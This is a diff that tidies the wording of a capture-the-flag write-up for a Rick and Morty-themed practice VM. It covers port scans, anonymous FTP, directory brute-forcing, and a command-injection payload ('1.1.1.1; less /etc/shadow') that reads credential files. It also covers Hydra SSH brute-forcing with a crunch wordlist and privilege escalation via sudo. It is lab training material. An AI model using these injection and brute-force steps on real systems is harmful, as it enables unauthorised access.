@@ -2,12 +2,12 @@
 
 (There are 130 points)
 
-finding ip address:
+Finding IP address:
 ```
 sudo arp-scan -l
 ```
 
-nmap scan:
+Nmap scan:
 ```
 nmap -sV -O -T4 --min-rate=10000 $ip
 ```
@@ -24,7 +24,7 @@ OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.2 - 4.14
 ```
 
-port scan:
+Port scan:
 ```
 nmap -sC -sV -Pn -p21,22,80,9090 $ip
 ```
@@ -45,8 +45,8 @@ output
 9090/tcp open  http    Cockpit web service 161 or earlier
 |_http-title: Did not follow redirect to https://10.170.71.213:9090/
 ```
-saw `flag.txt` in ftp also anon login allowed 
-also doing a all ports scan:
+Saw `flag.txt` in FTP, also anonymous login allowed 
+Also doing an all ports scan:
 ```
 nmap -sV -O -T4 -p- --min-rate=10000 $ip
 ```
@@ -61,12 +61,12 @@ PORT      STATE SERVICE VERSION
 22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
 60000/tcp open  unknown
 ```
-login with ftp:
+Login with FTP:
 ```
 ftp $ip
 ```
-username: `anonymous`
-password: `anonymous`
+Username: `anonymous`
+Password: `anonymous`
 output
 ```zsh
 ftp> ls
@@ -86,15 +86,15 @@ ftp> exit
 221 Goodbye.
 ```
 
-read the `FLAG.txt`
+Read the `FLAG.txt`
 `FLAG{Whoa this is unexpected} - 10 Points`=10/130
 
-next port 9090
-went to website `$ip:9090`
-got another flag
+Next port 9090
+Went to website `$ip:9090`
+Got another flag
 `FLAG {There is no Zeus, in your face!} - 10 Points`=20/130
 
-scanning the remaining ports:
+Scanning the remaining ports:
 ```
 nmap -sC -sV -Pn -p13337,60000 $ip
 ```
@@ -112,12 +112,12 @@ PORT      STATE SERVICE VERSION
 |_    Welcome to Ricks half baked reverse shell...
 ```
 
-got a flag from `13337`
+Got a flag from `13337`
 `FLAG:{TheyFoundMyBackDoorMorty}-10Points` = 30/130
 
-went to http 
-check the source code nothing important there
-run gobuster
+Went to HTTP 
+Check the source code - nothing important there
+Run Gobuster
 ```
 gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -t 300 -x txt,php,html -q
 ```
@@ -144,27 +144,27 @@ output
 /.hta.txt             (Status: 403) [Size: 217]
 
 ```
-went to `/passwords` got a flag from there
+Went to `/passwords` and got a flag from there
 `FLAG{Yeah d- just don't do it.} - 10 Points`=40/130
-got a password: winter
+Got a password: winter
 from `/passwords.html`
 
-went to `robots.txt`
+Went to `robots.txt`
 ```
 /cgi-bin/root_shell.cgi
 /cgi-bin/tracertool.cgi
 /cgi-bin/*
 ```
 
-went to `/cgi-bin/root_shell.cgi` nothing important
-went to `/cgi-bin/tracertool.cgi` - saw a tracer machine
-check source code for blocking parameters like " ; " "&&" "| "
-confirmed it blocks nothing 
+Went to `/cgi-bin/root_shell.cgi` - nothing important
+Went to `/cgi-bin/tracertool.cgi` - saw a tracer machine
+Check source code for blocking parameters like ";" "&&" "|"
+Confirmed it blocks nothing 
 did 
 ```
 1.1.1.1; whoami
 ```
-got as `apache` so Command Injection works
+Got as `apache`, so Command Injection works
 tried
 ```
 uname -a
@@ -173,11 +173,11 @@ output
 ```apache
 Linux localhost.localdomain 4.11.8-300.fc26.x86_64 #1 SMP Thu Jun 29 20:09:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 ```
-check the pwd
+Check the pwd
 `/var/www/cgi-bin`
-tried prev escalation through `shell.cgi` didn't worked
+Tried previous escalation through `shell.cgi` - didn't work
 
-its possible read the `/etc/passwd`
+It's possible to read the `/etc/passwd`
 ```
 1.1.1.1; less /etc/shadow
 ```
@@ -187,47 +187,47 @@ RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
 Morty:x:1001:1001::/home/Morty:/bin/bash
 Summer:x:1002:1002::/home/Summer:/bin/bash
 ```
-the password winter must be the pass of summer
+The password "winter" must be the password of Summer
 
 ```
 ssh Summer@$ip -p 22222
 ```
-login success
+Login success
 ```ssh
 [Summer@localhost ~]$ ls
 FLAG.txt
 [Summer@localhost ~]$ tail FLAG.txt 
 FLAG{Get off the high road Summer!} - 10 Points
 ```
-got flag `FLAG{Get off the high road Summer!} - 10 Points`=50/130
- tried `cd ../Morty`
- it works so download the home directory of the machine
+Got flag `FLAG{Get off the high road Summer!} - 10 Points`=50/130
+Tried `cd ../Morty`
+It works so download the home directory of the machine
  ```
  scp -p 22222 -r Summer@$ip:/home /home/aswil/Trash
  ```
-went to Morty's directory 
-got 2 files 
-a password protected zip and an image
-just read the image and got the password
+Went to Morty's directory 
+Got 2 files 
+A password-protected zip and an image
+Just read the image and got the password
 `Meeseek`
-unzip the file and read the txt
+Unzip the file and read the txt
 ```
 unzip journal.txt.zip && cat journal.txt
 ```
-got the flag
+Got the flag
 `FLAG: {131333} - 20 Points`=70/130
 
-went to Rick directory
-saw a safe on `/RickSanchez/RICKS_SAFE`
-just run it
+Went to Rick directory
+Saw a safe at `/RickSanchez/RICKS_SAFE`
+Just run it
 ```
 ./safe
 ```
-got output as 
+Got output as 
 `Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!`
-so need to use  arguments
-trying the last flag
-used the last flag
+So need to use arguments
+Trying the last flag
+Used the last flag
 ```
 ./safe 131333
 ```
@@ -246,19 +246,19 @@ One of the words in my old bands name.
 ```
 got the flag
 `FLAG{And Awwwaaaaayyyy we Go!} - 20 Points`=90/130
-also got the password hint
+Also got the password hint
 
-got his band name as:
+Got his band name as:
 `The Flesh Curtains` in the episode `Big Trouble in Little Sanchez`
 
-used `crunch` to make a custom wordlist
+Used `crunch` to make a custom wordlist
 ```
 crunch 5 5 -t ,%The > rick_wordlist.txt
 crunch 7 7 -t ,%Flesh >> rick_wordlist.txt
 crunch 10 10 -t ,%Curtains >> rick_wordlist.txt
 ```
 
-used hydra to brute-force the ssh of `RickSanchez`
+Used Hydra to brute-force the SSH of `RickSanchez`
 ```
 hydra -l RickSanchez -P rick_wordlist.txt $ip ssh -f -W 5 -t 64 -s 22222
 ```
@@ -271,11 +271,11 @@ output
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-login as RickSanchez 
+Login as RickSanchez 
 ```
 ssh RickSanchez@$ip -p 22222
 ```
-checked sudo perms
+Checked sudo permissions
 ```
 sudo -l
 ```
@@ -292,7 +292,7 @@ User RickSanchez may run the following commands on localhost:
 
 **`(ALL) ALL`**
 This means user `RickSanchez` is allowed to run **any command** as root using `sudo` without any restrictions.
-immediately went 
+Immediately went 
 ```
 sudo su
 ```
@@ -303,11 +303,11 @@ head FLAG.txt
 ```
 `FLAG: {Ionic Defibrillator} - 30 points`=120/130
 
-connect to the remaining port `60000`
+Connect to the remaining port `60000`
 ```
 nc $ip 60000
 ```
-and got the flag
+And got the flag
 ```bash
 Welcome to Ricks half baked reverse shell...
 # ls
@@ -316,6 +316,6 @@ FLAG.txt
 FLAG{Flip the pickle Morty!} - 10 Points 
 
 ```
- got the final flag
+Got the final flag
  `FLAG{Flip the pickle Morty!} - 10 Points`=130/130
  
